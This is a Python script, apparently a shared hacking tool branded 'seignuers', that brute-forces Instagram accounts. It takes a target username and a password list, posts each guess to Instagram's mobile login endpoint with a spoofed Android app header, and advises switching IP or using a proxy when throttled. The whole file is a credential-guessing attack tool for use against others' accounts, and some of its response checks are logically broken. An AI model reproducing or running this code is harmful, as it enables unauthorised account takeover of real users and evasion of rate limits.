
aksh=input(' please enter the password -->>>> ' )
print('\n')
if aksh=='seignuersontop':
   print(' your password is correct ' )

else:
  print(' your password is incorrect ' )
  print('\n')
  exit()
print('\n')







from os import name , system
from requests import post
from colorama import Fore
from datetime import datetime
from uuid import uuid4
from time import sleep
import json
import webbrowser
red = Fore.RED
green = Fore.GREEN
blue = Fore.BLUE
white = Fore.WHITE
if name == 'nt':
    system('cls')
    webbrowser.open('https://t.me/seignuersofficial')
else:
    system('clear')
    system('xdg-open https://t.me/seignuersofficial')
print(white+'''





                                 
       
   █▀ █▀▀ █ █▀▀ █▄░█ █░█ █▀▀ █▀█ █▀
   ▄█ ██▄ █ █▄█ █░▀█ █▄█ ██▄ █▀▄ ▄█   




'''+white)
uid = str(uuid4())
log_head = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)','Accept': "*/*",'Cookie': 'missing','Accept-Encoding': 'gzip, deflate','Accept-Language': 'en-US','X-IG-Capabilities': '3brTvw==','X-IG-Connection-Type': 'WIFI','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Host': 'i.instagram.com'}
link = 'https://i.instagram.com/api/v1/accounts/login/'
user = input(red+'[!]'+white+' Please Enter The Target Instagarm Username Here : ')
passlist = input(red+'[!]'+white+' Please Enter Your Password List Filename Or Path : ')
print('\n\n')
passlist = open(passlist).read().splitlines()
for pwd in passlist:
    try:
        log_data = {'uuid': uid,'password': pwd,'username': user,'device_id': uid,'from_reg': 'false','_csrftoken': 'missing','login_attempt_countn': '0'}
        login = post(link,headers=log_head,data=log_data,allow_redirects=True)
        if 'logged_in_user' in login.text:
            print(green+'[+]'+white+f' {user}:{pwd}')
            break
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in login.text:
            print(red+'[-]'+white+f' {user}:{pwd}')
        elif 'Bad request' or 'Please wait a few minutes' or 'challenge_required' or 'two' in login.txt:
            print(blue+'[!]'+' You Have To Change Your IP Address !')
        else:
            pass
    except KeyboardInterrupt:
        print(red+'[!]'+white+' Program Stopped By User ...')
        exit()
    except:
        print(red+'[!]'+white+' An Error Occoured ! , Please Use Powerful Internet & Proxy ...')
        exit()
